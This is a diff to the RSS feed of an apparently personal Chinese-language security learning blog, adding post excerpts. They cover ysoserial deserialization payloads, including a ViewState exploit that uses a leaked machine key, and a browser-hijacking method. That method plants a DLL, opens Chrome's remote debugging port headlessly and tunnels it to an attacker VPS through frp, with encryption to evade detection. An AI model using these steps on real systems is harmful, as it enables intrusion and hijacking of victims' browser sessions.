@@ -1,13 +1,85 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>Posts on H4ck3r Station</title>
+    <title>Posts on Cybersecurity learning</title>
     <link>http://localhost:1313/posts/</link>
-    <description>Recent content in Posts on H4ck3r Station</description>
+    <description>Recent content in Posts on Cybersecurity learning</description>
     <generator>Hugo -- 0.155.1</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Thu, 19 Mar 2026 00:33:54 +0800</lastBuildDate>
+    <lastBuildDate>Fri, 10 Apr 2026 23:50:39 +0800</lastBuildDate>
     <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Yso</title>
+      <link>http://localhost:1313/posts/yso/</link>
+      <pubDate>Fri, 10 Apr 2026 23:50:39 +0800</pubDate>
+      <guid>http://localhost:1313/posts/yso/</guid>
+      <description>&lt;h2 id=&#34;java_yso&#34;&gt;JAVA_YSO&lt;/h2&gt;
+&lt;h5 id=&#34;基础命令格式&#34;&gt;基础命令格式&lt;/h5&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;java -jar ysoserial.jar &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;利用链&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;执行的命令&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;利用链: CommonsCollections1, URLDNS, Jackson 等
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;探测检测&#34;&gt;探测/检测&lt;/h5&gt;
+&lt;p&gt;如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用&lt;code&gt;URLDNS&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;java -jar ysoserial.jar URLDNS &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://your-dnslog-url.com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注: 如果执行复杂命令最好封装成脚本执行,或者使用&lt;code&gt;sh -c&lt;/code&gt;/&lt;code&gt;bash -c&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;net_yso&#34;&gt;.net_yso&lt;/h2&gt;
+&lt;p&gt;基础命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ysoserial.exe -g &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Gadget&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; -f &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Formatter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[Command]&amp;#34;&lt;/span&gt; -o 编码
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-g  利用链的名称,如TextFormattingRunProperties
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-c  执行的命令
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-o  编码处理,如 raw ,bash64, urlencode
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用  (web Machinekey泄露)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd /c echo pwned &amp;gt; C:\windows\temp\test.txt&amp;#34;&lt;/span&gt; --validationkey&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你的KEY&amp;#34;&lt;/span&gt; --validationalg&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;技巧&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;- p&lt;/code&gt; 参数可以指定插件,对一些特定目标进行测试&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-p ViewState：处理 ASP.NET ViewState。
+-p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用链:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>浏览器劫持</title>
+      <link>http://localhost:1313/posts/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/</link>
+      <pubDate>Mon, 30 Mar 2026 21:28:24 +0800</pubDate>
+      <guid>http://localhost:1313/posts/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/</guid>
+      <description>&lt;h2 id=&#34;实现方式&#34;&gt;实现方式:&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;h3 id=&#34;开启远程调试端口&#34;&gt;开启远程调试端口&lt;/h3&gt;
+&lt;p&gt;首先将dll插入浏览器目录后,使用命令将对方的远程调试端口开起来&lt;code&gt;chrome.exe --remote-debugging-port=9222 --remote-allow-origins=*  --headless &lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;--remote-debugging-port	指定端口
+--remote-allow-origins 避免403
+--headless 避免弹窗
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注: 如果对方已经开启浏览器需要将浏览器关闭后才能运行插入的dll,关闭浏览器命令&lt;code&gt;taskkill /F /IM chrome.exe /T&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;开启端后查看端口是否在运行监听&lt;code&gt;netstat -ano | findstr :9222&lt;/code&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;
+&lt;h3 id=&#34;打隧道&#34;&gt;打隧道&lt;/h3&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;通过frp打通隧道frpc配置&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[common]
+# 你的 VPS 公网 IP
+server_addr = x.x.x.x
+server_port = 7000
+token = my_secure_token_123
+
+[chrome_debug]
+type = tcp
+local_ip = 127.0.0.1
+# 对应 Chrome 启动时的 --remote-debugging-port
+local_port = 9222
+# 映射到 VPS 上的端口（确保 VPS 防火墙已开放此端口）
+remote_port = 19222
+
+# 【实战建议】开启加密和压缩，躲避流量检测
+use_encryption = true
+use_compression = true
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;frps&lt;/p&gt;</description>
+    </item>
     <item>
       <title>XSS</title>
       <link>http://localhost:1313/posts/xss/</link>
@@ -563,6 +635,78 @@ Windows (XAMPP)	C:\xampp\htdocs\
 Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
 &lt;p&gt;方法一: &amp;ndash;os-shell&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/posts/c/c-%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/c/c-%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0/</guid>
+      <description>&lt;h1 id=&#34;c-语言-学习&#34;&gt;C 语言 学习&lt;/h1&gt;
+&lt;p&gt;学习c语言是为了后面学习免杀,记录一下学习过程方便温习&lt;/p&gt;
+&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;
+&lt;h4 id=&#34;程序执行的两种方式&#34;&gt;程序执行的两种方式:&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;解释: 借助一个程序,读懂你写的程序去执行&lt;/li&gt;
+&lt;li&gt;编译: 借助一个程序,把你的程序翻译成计算机懂得语言&amp;ndash;机器语言&amp;ndash;写的程序,然后执行(整体转换为机器码后，由系统直接调度执行)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;整数类型&#34;&gt;整数类型&lt;/h3&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;类型&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;存储大小&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;值范围&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;char&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-128 到 127 或 0 到 255&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned char&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 255&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;signed char&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-128 到 127&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;int&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned int&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535 或 0 到 4,294,967,295&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;short&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned short&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;long&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-2,147,483,648 到 2,147,483,647&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned long&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 4,294,967,295&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;一个demo:&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
